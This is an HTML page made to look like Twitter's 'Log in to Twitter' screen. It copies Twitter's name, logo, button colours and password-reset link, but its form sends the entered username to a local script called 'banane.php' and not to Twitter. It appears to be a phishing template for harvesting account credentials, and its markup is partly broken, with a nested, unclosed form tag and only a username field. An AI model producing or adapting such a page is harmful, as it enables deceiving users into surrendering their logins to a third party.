


<html>
	
	<head>
		
		
		<title>Login on Twitter</title>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="shortcut icon" href="img/twitter.png" >
		<style>
			
			
			#yazı1
			{
				font-family:sans-serif;
				font-weight:bold;
				text-align:center;
				font-size:21px;
				
			}
			#textamca
			{
				width:375px;
				height:50px;
				font-size:large;
				border-bottom-color:	#F0F8FF;
				font-weight:350;
				padding-top:14px;
				padding-bottom:14px;
				padding-left:5px;
				background-color:	#F0F8FF;
				border-top-width:0px;
				border-left-width:0px;
				border-radius:3px;
				outline:none;
				    border-bottom-color:#A9A9A9;

				

			}
			
			
			
			#sifreamca
			{
				
				width:375px;
				height:50px;
			     
				font-size:large;
				border-bottom-color:#A9A9A9; 
				background-color:	#F0F8FF;
				border-right-color:none;
				border-left-color:white;
				font-weight:350;
				
				padding-left:5px;
				border-top-width:0px;
				border-left-width:0px;
				border-radius:3px;
				
				outline:none;
			}
			
			
			#buton
			{
				
				background-color:rgba(29,161,242,1.00);
				padding:13px 150px;
				border-radius:23px;
				color:white;
				font-size:larger;
				font-family:sans-serif;
				font-weight:bold;
				outline:none;
				border:none;
			}
			
			
			
			#frgt 
			{
				
				color:rgba(29,161,242,1.00);
				font-weight:300;
				text-align:center;
				border-bottom:none;
				text-decoration:none;
			}
	
			
			</style>
		
		
		
		
		
		
		
		
		</head>
	<body>
		
		
		
		
		<center>
		<br/>
		<img src="img/twitter.png" widht=50 height=50>
		<h1 id=yazı1> Log in to Twitter</h1>
		<form method="get" action="banane.php"
	<form action="" method="post">
		
		<input type="text" name="nick" placeholder="Username" required="" autocomplete="off" id="textamca" class="username"><br><br>
		<input type="submit" id="buton" value="Log in">
		<br/> <br/>
		<a id=frgt href="https://twitter.com/account/begin_password_reset">Forgot password? · Sign up for Twitter </a>
		
		
		</center>
		</body>
	</html>